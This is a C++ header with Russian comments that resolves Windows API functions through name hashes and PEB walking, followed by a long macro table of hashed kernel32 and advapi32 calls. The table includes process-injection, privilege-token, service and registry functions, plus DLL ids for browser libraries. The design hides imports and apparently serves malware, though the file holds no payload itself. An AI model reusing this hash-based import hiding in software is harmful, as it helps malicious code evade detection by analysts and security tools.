
#ifndef GetApiH
#define GetApiH
//----------------------------------------------------------------------------
#pragma once
#include <windows.h>


//*******************************************************************
//  InitializeAPI - Функция инициализирует систему для работы с АПИ
//
//  ВАЖНО!!!!!!!
//
//  Перед использованием АПИ в процессе необходимо провести
//  инициализацию
//
//
//*******************************************************************
BOOL InitializeAPI();



enum TDllId
{

	DLL_KERNEL32   = 1,
	DLL_ADVAPI32   = 2,
	DLL_USER32     = 3,
	DLL_WINSOCK    = 4,
	DLL_NTDLL      = 5,
	DLL_WINSTA     = 6,
	DLL_SHELL32    = 7,
	DLL_WININET    = 8,
	DLL_URLMON     = 9,
	DLL_NSPR4      = 10,
	DLL_SSL3       = 11,
	DLL_WINMM      = 12,
	DLL_CABINET    = 13,
	DLL_OPERA      = 14,
	DLL_GDI		   = 15,  /* gdi32.dll     */
	DLL_GDIPLUS	   = 16,  /* gdiplus.dll   */
	DLL_CRYPT32	   = 17,  /* crypt32.dll   */
	DLL_PSAPI	   = 18,  /* psapi.dll     */
	DLL_SHLWAPI	   = 19,  /* shlwapi.dll   */
	DLL_IPHLPAPI   = 20,  /* Iphlpapi.dll  */
	DLL_WINSPOOL   = 21,  /* winspool_drv* */
	DLL_COMMDLG32  = 22,  /* commdlg32_dll */
	DLL_ODBC32	   = 23,  /* odbc32_dll    */
	DLL_VERSION    = 24,  /* version.dll   */
	DLL_OLE32      = 25,  /* ole32.dll     */
	DLL_IMAGEHLP   = 26,  /* Imagehlp.dll  */
	DLL_CRYPTDLL   = 27,  /* cryptdll.dll  */
};


//--------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//--------------------------------------------------
PCHAR GetDLLName(TDllId ID);

//--------------------------------------------------
//  GetPEB - Функция возвращает адрес структуры PEB
//--------------------------------------------------
LPVOID GetPEB();


//--------------------------------------------------
//  GetImageBase - Функция возвращает базовый
//                 адрес загруженного образа
//  ProcAddr - Адрес функции с которого начинается
//             поиск. Если не указать, то будет
//             использован адрес самой функции
//--------------------------------------------------
LPVOID WINAPI GetImageBase(LPVOID ProcAddr = NULL);


LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
HMODULE GetDllBase( DWORD dwDllHash );
HMODULE GetKernel32();

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex);

//DWORD pGetLastError();


template <DWORD h, DWORD hash, int CacheIndex>
inline LPVOID pushargEx()
{
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx2(NULL, h, hash, CacheIndex );
	return func();
}

template <DWORD h, DWORD hash, int CacheIndex, class A>
inline LPVOID pushargEx(A a1)
{
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2,a3);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2,a3,a4);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
}

template <DWORD h, DWORD hash, int CacheIndex, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
						A9 a9, A10 a10, A11 a11, A12 a12)
{
	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
									A11, A12);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}




//******************************************************************
//
//  ФАЖНО!!!!
//
//  Индексы кэша (третий параметр в объявлении) строжайше запрещено
//  менять вручную!!!!
//
//  Индексы кэша автоматически проставляет служебная утилита.
//  При добавлении новой функции, индекс указывать 0
//
//  Например:
//
//  #define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
//
//******************************************************************


//**************************************************
// Размер кэша хранения адресов функций
//
// Значение автоматически устанавливается утилитой
//
// Не переименовывать, не изменять значение!!!!!!!
//
//**************************************************
const static int ApiCacheSize = 569;



//kernel32
#define pLoadLibraryA 				pushargEx< DLL_KERNEL32, 0xC8AC8026, 2 >
#define pLoadLibraryW 				pushargEx< DLL_KERNEL32, 0xC8AC8030, 3 >
#define pLoadLibraryExA 			pushargEx< DLL_KERNEL32, 0x20088E6A, 4 >
#define pLoadLibraryExW 			pushargEx< DLL_KERNEL32, 0x20088E7C, 5 >
#define pFreeLibrary 				pushargEx< DLL_KERNEL32, 0x4B935B8E, 6 >
#define pGetProcAddress 			pushargEx< DLL_KERNEL32, 0x1FC0EAEE, 7 >
#define pTerminateProcess			pushargEx< DLL_KERNEL32, 0x9E6FA842, 8 >
#define pVirtualAlloc 				pushargEx< DLL_KERNEL32, 0x697A6AFE, 9 >
#define pVirtualAllocEx 			pushargEx< DLL_KERNEL32, 0x9ABFB8A6, 10 >
#define pVirtualFree 				pushargEx< DLL_KERNEL32, 0x3A35705F, 11 >
#define pVirtualFreeEx 				pushargEx< DLL_KERNEL32, 0x5C17EC75, 12 >
#define pVirtualQuery 				pushargEx< DLL_KERNEL32, 0x6A582465, 13 >
#define pVirtualQueryEx 			pushargEx< DLL_KERNEL32, 0x919786E, 14 >
#define pVirtualProtect 			pushargEx< DLL_KERNEL32, 0xA9DE6F5A, 15 >
#define pVirtualProtectEx 			pushargEx< DLL_KERNEL32, 0x9BD6888F, 16 >
#define pCloseHandle 				pushargEx< DLL_KERNEL32, 0x723EB0D5, 17 >
#define pGlobalAlloc 				pushargEx< DLL_KERNEL32, 0x725EA171, 18 >
#define pGlobalFree 				pushargEx< DLL_KERNEL32, 0x240339C8, 19 >
#define pCreateFileA 				pushargEx< DLL_KERNEL32, 0x8F8F114, 20 >
#define pCreateFileW 				pushargEx< DLL_KERNEL32, 0x8F8F102, 21 >
#define pWriteFile 					pushargEx< DLL_KERNEL32, 0xF3FD1C3, 22 >
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xC80715CE, 23 >
#define pWriteProcessMemory 		pushargEx< DLL_KERNEL32, 0xBEA0BF35, 24 >
#define pCreateRemoteThread 		pushargEx< DLL_KERNEL32, 0xE61874B3, 25 >
#define pReadFile 					pushargEx< DLL_KERNEL32, 0x487FE16B, 26 >
#define pSetFilePointer 			pushargEx< DLL_KERNEL32, 0xEF48E03A, 27 >
#define pSetEndOfFile 				pushargEx< DLL_KERNEL32, 0x2D0D9D61, 28 >
#define pCopyFileA 					pushargEx< DLL_KERNEL32, 0x2EE4F10D, 29 >
#define pCopyFileW 					pushargEx< DLL_KERNEL32, 0x2EE4F11B, 30 >
#define pMoveFileA 					pushargEx< DLL_KERNEL32, 0x20E4E9ED, 31 >
#define pMoveFileW 					pushargEx< DLL_KERNEL32, 0x20E4E9FB, 32 >
#define pMoveFileExA 				pushargEx< DLL_KERNEL32, 0x3A7A7478, 33 >
#define pMoveFileExW 				pushargEx< DLL_KERNEL32, 0x3A7A746E, 34 >
#define pDeleteFileA 				pushargEx< DLL_KERNEL32, 0x81F0F0DF, 35 >
#define pDeleteFileW 				pushargEx< DLL_KERNEL32, 0x81F0F0C9, 36 >
#define pGetFileSize 				pushargEx< DLL_KERNEL32, 0xAEF7CBF1, 37 >
#define pCreateFileMappingA 		pushargEx< DLL_KERNEL32, 0xEF0A25B7, 38 >
#define pCreateFileMappingW 		pushargEx< DLL_KERNEL32, 0xEF0A25A1, 39 >
#define pMapViewOfFile 				pushargEx< DLL_KERNEL32, 0x5CD9430, 40 >
#define pGetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C071, 41 >
#define pSetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C571, 42 >
#define pGetModuleHandleA 			pushargEx< DLL_KERNEL32, 0xA48D6762, 43 >
#define pGetModuleHandleW 			pushargEx< DLL_KERNEL32, 0xA48D6774, 44 >
#define pUnmapViewOfFile 			pushargEx< DLL_KERNEL32, 0x77CD9567, 45 >
#define pWaitForSingleObject 		pushargEx< DLL_KERNEL32, 0xC54374F3, 46 >
#define pSleep 						pushargEx< DLL_KERNEL32, 0x3D9972F5, 47 >
#define pWideCharToMultiByte 		pushargEx< DLL_KERNEL32, 0xE74F57EE, 48 >
#define pMultiByteToWideChar 		pushargEx< DLL_KERNEL32, 0x5AA7E70B, 49 >
#define pGetModuleFileNameA 		pushargEx< DLL_KERNEL32, 0x774393E8, 50 >
#define pGetModuleFileNameW 		pushargEx< DLL_KERNEL32, 0x774393FE, 51 >
#define pGetSystemDirectoryA 		pushargEx< DLL_KERNEL32, 0x49A1374A, 52 >
#define pGetSystemDirectoryW 		pushargEx< DLL_KERNEL32, 0x49A1375C, 53 >
#define pGetTempPathA 				pushargEx< DLL_KERNEL32, 0x58FE7ABE, 54 >
#define pGetTempPathW 				pushargEx< DLL_KERNEL32, 0x58FE7AA8, 55 >
#define pGetVolumeInformationA 		pushargEx< DLL_KERNEL32, 0x67ECDE97, 56 >
#define pGetVolumeInformationW 		pushargEx< DLL_KERNEL32, 0x67ECDE81, 57 >
#define pSetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x4D5587B7, 58 >
#define pSetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x4D5587A1, 59 >
#define pCreateProcessA 			pushargEx< DLL_KERNEL32, 0x46318AC7, 60 >
#define pCreateProcessW 			pushargEx< DLL_KERNEL32, 0x46318AD1, 61 >
#define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24, 62 >
#define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32, 63 >
#define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0, 64 >
#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395, 65 >
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C, 66 >
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A, 67 >
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2, 68 >
#define pGetVersion 				pushargEx< DLL_KERNEL32, 0xCB932CE2, 69 >
#define pDeviceIoControl 			pushargEx< DLL_KERNEL32, 0x82E8173, 70 >
#define pQueryDosDeviceA 			pushargEx< DLL_KERNEL32, 0xAC81BECB, 71 >
#define pQueryDosDeviceW 			pushargEx< DLL_KERNEL32, 0xAC81BEDD, 72 >
#define pIsBadReadPtr 				pushargEx< DLL_KERNEL32, 0x7D544DBD, 73 >
#define pIsBadWritePtr 				pushargEx< DLL_KERNEL32, 0xAC85818D, 74 >
#define pGetCurrentProcess 			pushargEx< DLL_KERNEL32, 0xD89AD05, 75 >
#define pCreateEventW 				pushargEx< DLL_KERNEL32, 0x8D5A50CA, 76 >
#define pSetEvent 					pushargEx< DLL_KERNEL32, 0x5E7EE0D0, 77 >
#define pResetEvent 				pushargEx< DLL_KERNEL32, 0x3B3EE0F9, 78 >
#define pGetShortPathNameA 			pushargEx< DLL_KERNEL32, 0x223296ED, 79 >
#define pGetShortPathNameW 			pushargEx< DLL_KERNEL32, 0x223296FB, 80 >
#define pLocalFree 					pushargEx< DLL_KERNEL32, 0x84033DEB, 81 >
#define pGetPrivateProfileStringA 	pushargEx< DLL_KERNEL32, 0xAA19E291, 82 >
#define pGetPrivateProfileStringW 	pushargEx< DLL_KERNEL32, 0xAA19E287, 83 >
#define pGetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x475587B7, 84 >
#define pGetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x475587A1, 85 >
#define pGetEnvironmentVariableA 	pushargEx< DLL_KERNEL32, 0x9802EF30, 86 >
#define pGetEnvironmentVariableW 	pushargEx< DLL_KERNEL32, 0x9802EF26, 87 >
#define pReadProcessMemory 			pushargEx< DLL_KERNEL32, 0x9D00A761, 88 >
#define pExitProcess 				pushargEx< DLL_KERNEL32, 0x95902B19, 89 >
#define pOpenProcess 				pushargEx< DLL_KERNEL32, 0x99A4299D, 90 >
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0x6B416786, 91 >
#define pProcess32First 			pushargEx< DLL_KERNEL32, 0x19F78C90, 92 >
#define pProcess32Next 				pushargEx< DLL_KERNEL32, 0xC930EA1E, 93 >
#define pCreateToolhelp32Snapshot	pushargEx< DLL_KERNEL32, 0x5BC1D14F, 94 >
#define pWinExec 					pushargEx< DLL_KERNEL32, 0xE8BF6DAD, 95 >
#define pFindResourceA 				pushargEx< DLL_KERNEL32, 0x8FE060C, 96 >
#define pSetLastError 				pushargEx< DLL_KERNEL32, 0x1295012C, 97 >
#define pLoadResource 				pushargEx< DLL_KERNEL32, 0x1A10BD8B, 98 >
#define pLockResource 				pushargEx< DLL_KERNEL32, 0x1510BD8A, 99 >
#define pSizeofResource 			pushargEx< DLL_KERNEL32, 0x86867F0E, 100 >
#define pLockRsrc 					pushargEx< DLL_KERNEL32, 0xBAC5467D, 101 >
#define pGetTempFileNameA 			pushargEx< DLL_KERNEL32, 0xFA4F502, 102 >
#define pGetTempFileNameW 			pushargEx< DLL_KERNEL32, 0xFA4F514, 103 >
#define pGetLongPathNameA 			pushargEx< DLL_KERNEL32, 0x9835D5A1, 104 >
#define pCreateEventA				pushargEx< DLL_KERNEL32, 0x8D5A50DC, 105 >
#define pConnectNamedPipe			pushargEx< DLL_KERNEL32, 0x7235F00E, 106 >
#define pDisconnectNamedPipe   		pushargEx< DLL_KERNEL32, 0x46C6B01F, 107 >
#define pCreateNamedPipeA			pushargEx< DLL_KERNEL32, 0x42F9BB48, 108 >
#define pGetTickCount				pushargEx< DLL_KERNEL32, 0x69260152, 109 >
#define pExitThread					pushargEx< DLL_KERNEL32, 0x768AA260, 110 >
#define plstrcmpiA					pushargEx< DLL_KERNEL32, 0x515BE757, 111 >
#define pSuspendThread				pushargEx< DLL_KERNEL32, 0xEEBA5EBA, 112 >
#define pGetComputerNameA			pushargEx< DLL_KERNEL32, 0x3DEF91BA, 113 >
#define pGetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DE02F, 114 >
#define pSetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DC82F, 115 >
#define pResumeThread				pushargEx< DLL_KERNEL32, 0x7B88BF3B, 116 >
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0x654F3F9E, 117 >
#define	pWTSGetActiveConsoleSessionId	pushargEx< DLL_KERNEL32, 0x654FEEAC, 118 >
#define pOpenMutexA					pushargEx< DLL_KERNEL32, 0xAE52C609, 119 >
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0xE24394E4, 120 >
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0xE24394F2, 121 >
#define pTerminateThread			pushargEx< DLL_KERNEL32, 0xC09D5D66, 122 >
#define plopen						pushargEx< DLL_KERNEL32, 0xCDFC3010, 123 >
#define plstrcmpA					pushargEx< DLL_KERNEL32, 0x2CA2B7E6, 124 >
#define plstrcmpW					pushargEx< DLL_KERNEL32, 0x2CA2B7F0, 125 >
#define plstrcatA					pushargEx< DLL_KERNEL32, 0x2CA1B5E6, 126 >
#define plstrcatW					pushargEx< DLL_KERNEL32, 0x2CA1B5F0, 127 >
#define plstrcpyA					pushargEx< DLL_KERNEL32, 0x2CA5F366, 128 >
#define plstrcpyW					pushargEx< DLL_KERNEL32, 0x2CA5F370, 129 >
#define plstrlenA					pushargEx< DLL_KERNEL32, 0x2D40B8E6, 130 >
#define plstrlenW					pushargEx< DLL_KERNEL32, 0x2D40B8F0, 131 >
#define pThread32First				pushargEx< DLL_KERNEL32, 0x89B968D2, 132 >
#define pThread32Next				pushargEx< DLL_KERNEL32, 0x4C1077D6, 133 >
#define pOpenThread					pushargEx< DLL_KERNEL32, 0x7E92CA65, 134 >
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0x78B00C7E, 135 >
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0x78B00C68, 136 >
#define pFindFirstFileA				pushargEx< DLL_KERNEL32, 0x32432444, 137 >
#define pFindFirstFileW				pushargEx< DLL_KERNEL32, 0x32432452, 138 >
#define pFindNextFileA				pushargEx< DLL_KERNEL32, 0x279DEAD7, 139 >
#define pFindNextFileW				pushargEx< DLL_KERNEL32, 0x279DEAC1, 140 >
#define pFindClose  				pushargEx< DLL_KERNEL32, 0x7B4842C1, 141 >
#define pRemoveDirectoryA			pushargEx< DLL_KERNEL32, 0x4AE7572B, 142 >
#define pInitializeCriticalSection	pushargEx< DLL_KERNEL32, 0xDA81BC58, 143 >
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0xF3B84F05, 144 >
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0x392B6027, 145 >
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0x7B2D2505, 146 >
#define pGetProcessHeap				pushargEx< DLL_KERNEL32, 0x68807354, 147 >
#define pHeapAlloc					pushargEx< DLL_KERNEL32, 0x5550B067, 148 >
#define pHeapReAlloc				pushargEx< DLL_KERNEL32, 0xFC7A6EFD, 149 >
#define pHeapSize					pushargEx< DLL_KERNEL32, 0x0AEBEA6A, 150 >
#define pHeapFree					pushargEx< DLL_KERNEL32, 0x084D25EA, 151 >
#define pGetCurrentThreadId			pushargEx< DLL_KERNEL32, 0xA45B370A, 152 >
#define pGetCurrentThread   		pushargEx< DLL_KERNEL32, 0x4FBA916C, 153 >
#define	pGlobalLock					pushargEx< DLL_KERNEL32, 0x25447AC6, 154 >
#define	pGlobalUnlock				pushargEx< DLL_KERNEL32, 0xF50B872, 155 >
#define pSetErrorMode				pushargEx< DLL_KERNEL32, 0x6C544060, 156 >
#define pGetFileInformationByHandle pushargEx< DLL_KERNEL32, 0xF149BCC4, 157 >
#define pFileTimeToLocalFileTime	pushargEx< DLL_KERNEL32, 0xE5792E94, 158 >
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0xB68EBEF8, 159 >
#define pOutputDebugStringA			pushargEx< DLL_KERNEL32, 0xD0498CD4, 160 >
#define pExpandEnvironmentStringsA	pushargEx< DLL_KERNEL32, 0x23EBE98B, 161 >
#define pExpandEnvironmentStringsW	pushargEx< DLL_KERNEL32, 0x23EBE99D, 162 >
#define pOutputDebugStringW			pushargEx< DLL_KERNEL32, 0xD0498CC2, 163 >
#define pLocalAlloc 				pushargEx< DLL_KERNEL32, 0x725CB0A1, 164 >
#define pFindFirstChangeNotificationA pushargEx< DLL_KERNEL32, 0xE8402F0, 165 >
#define pFindCloseChangeNotification  pushargEx< DLL_KERNEL32, 0x3634D801, 166 >
#define pFindNextChangeNotification   pushargEx< DLL_KERNEL32, 0xFAB3FE71, 167 >
#define pCreateDirectoryW			  pushargEx< DLL_KERNEL32, 0xA073561, 168 >
#define pCreateDirectoryA		    pushargEx< DLL_KERNEL32, 0xA073577, 169 >
#define pOpenEventW					pushargEx< DLL_KERNEL32, 0x9C70005F, 170 >
#define pGetSystemTimeAsFileTime	pushargEx< DLL_KERNEL32, 0x6951E92A, 171 >
#define pGetSystemTime 				pushargEx< DLL_KERNEL32, 0x270118E2, 172 >
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0x3B429F5F, 173 >
#define pCompareFileTime			pushargEx< DLL_KERNEL32, 0x41C9C8F5, 174 >
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0xEA7EA921, 175 >
#define pGetLogicalDriveStringsA  	pushargEx< DLL_KERNEL32, 0x70F6FE31, 176 >
#define pGetDriveTypeA          	pushargEx< DLL_KERNEL32, 0x399354CE, 177 >
#define pSleepEx				 	pushargEx< DLL_KERNEL32, 0x5CBD6D9E, 178 >
#define pGetProcessId				pushargEx< DLL_KERNEL32, 0x0e91a280, 179 >
#define pOpenEventA					pushargEx< DLL_KERNEL32, 0x9C700049, 180 >
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0xc8071758, 181 >
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xc807174e, 182 >
#define pDuplicateHandle			pushargEx< DLL_KERNEL32, 0x533d3b41, 183 >
#define pGetExitCodeThread			pushargEx< DLL_KERNEL32, 0x4E5A10B1, 184 >
#define pGetCommandLineA			pushargEx< DLL_KERNEL32, 0xFB0730C, 185 >
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0x11CC0678, 186 >
#define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B, 187 >
#define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33, 188 >
#define pGetLogicalDrives			pushargEx< DLL_KERNEL32, 0x6A3376B7, 189 >
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18, 190 >
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18, 191 >
#define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B, 192 >
#define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 193 >
#define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 194 >	
#define pGetStartupInfoA			pushargEx< DLL_KERNEL32, 0x407A1C6A, 195 >
#define _pGetLastError    			pushargEx< DLL_KERNEL32, 0x1297812C, 196 >
#define pWritePrivateProfileStringA	pushargEx< DLL_KERNEL32, 0xEEBA10CD, 197 >
#define pIsWow64Process             pushargEx< DLL_KERNEL32, 0x52AC19C,  198 >
#define pGetNativeSystemInfo        pushargEx< DLL_KERNEL32, 0x74B624BE, 199 >


//advapi32
//advapi32
#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 200 >
#define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD, 201 >
#define pOpenProcessToken 			pushargEx< DLL_ADVAPI32, 0x80DBBE07, 202 >
#define pLookupPrivilegeValueA 		pushargEx< DLL_ADVAPI32, 0x1B3D12B9, 203 >
#define pLookupPrivilegeValueW 		pushargEx< DLL_ADVAPI32, 0x1B3D12AF, 204 >
#define pAdjustTokenPrivileges 		pushargEx< DLL_ADVAPI32, 0x7A2167DC, 205 >
#define pRegOpenKeyExA 				pushargEx< DLL_ADVAPI32, 0xAAD67FF8, 206 >
#define pRegOpenKeyExW 				pushargEx< DLL_ADVAPI32, 0xAAD67FEE, 207 >
#define pRegQueryInfoKeyA 			pushargEx< DLL_ADVAPI32, 0xBDF4DB19, 208 >
#define pRegQueryInfoKeyW 			pushargEx< DLL_ADVAPI32, 0xBDF4DB0F, 209 >
#define pRegEnumKeyExA 				pushargEx< DLL_ADVAPI32, 0xB4F673FD, 210 >
#define pRegEnumKeyExW 				pushargEx< DLL_ADVAPI32, 0xB4F673EB, 211 >
#define pRegEnumValueA 				pushargEx< DLL_ADVAPI32, 0xF65A7D95, 212 >
#define pRegEnumValueW 				pushargEx< DLL_ADVAPI32, 0xF65A7D83, 213 >
#define pRegQueryValueExA 			pushargEx< DLL_ADVAPI32, 0x1802E7C8, 214 >
#define pRegQueryValueExW 			pushargEx< DLL_ADVAPI32, 0x1802E7DE, 215 >
#define pRegCloseKey 				pushargEx< DLL_ADVAPI32, 0xDB355534, 216 >
#define pRegDeleteKeyA 				pushargEx< DLL_ADVAPI32, 0x398C5285, 217 >
#define pRegDeleteKeyW 				pushargEx< DLL_ADVAPI32, 0x398C5293, 218 >
#define pRegSetValueExA 			pushargEx< DLL_ADVAPI32, 0x3E400FD6, 219 >
#define pRegSetValueExW 			pushargEx< DLL_ADVAPI32, 0x3E400FC0, 220 >
#define pGetUserNameA 				pushargEx< DLL_ADVAPI32, 0xB9D41C2F, 221 >
#define pGetUserNameW 				pushargEx< DLL_ADVAPI32, 0xB9D41C39, 222 >
#define pCreateServiceA 			pushargEx< DLL_ADVAPI32, 0x17B3DD2E, 223 >
#define pOpenServiceA 				pushargEx< DLL_ADVAPI32, 0x83969964, 224 >
#define pDeleteService 				pushargEx< DLL_ADVAPI32, 0xDE5D85F8, 225 >
#define pStartServiceA 				pushargEx< DLL_ADVAPI32, 0x1CA1FD2F, 226 >
#define pGetKernelObjectSecurity 	pushargEx< DLL_ADVAPI32, 0xB29136DD, 227 >
#define pOpenSCManagerA 			pushargEx< DLL_ADVAPI32, 0xA06E459C, 228 >
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0xF684C7A9, 229 >
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0xD4ECC759, 230 >
#define pInitializeSecurityDescriptor	pushargEx< DLL_ADVAPI32, 0xB8538A52, 231 >
#define pSetSecurityDescriptorOwner	pushargEx< DLL_ADVAPI32, 0xDADD5994, 232 >
#define pSetSecurityDescriptorDacl	pushargEx< DLL_ADVAPI32,0xCCD03C3A, 233 >
#define pSetFileSecurityW			pushargEx< DLL_ADVAPI32, 0x5A9B2FDD, 234 >
#define pRegCreateKeyW				pushargEx< DLL_ADVAPI32, 0xAE9E4290, 235 >
#define pRegCreateKeyA				pushargEx< DLL_ADVAPI32, 0xAE9E4286, 236 >
#define pRegCreateKeyExW			pushargEx< DLL_ADVAPI32, 0x90A097F0, 237 >
#define pRegCreateKeyExA			pushargEx< DLL_ADVAPI32, 0x90A097E6, 238 >
#define pRegSaveKeyA				pushargEx< DLL_ADVAPI32, 0xBEDEEFC5, 239 >
#define pRegSaveKeyW				pushargEx< DLL_ADVAPI32, 0xBEDEEFD3, 240 >
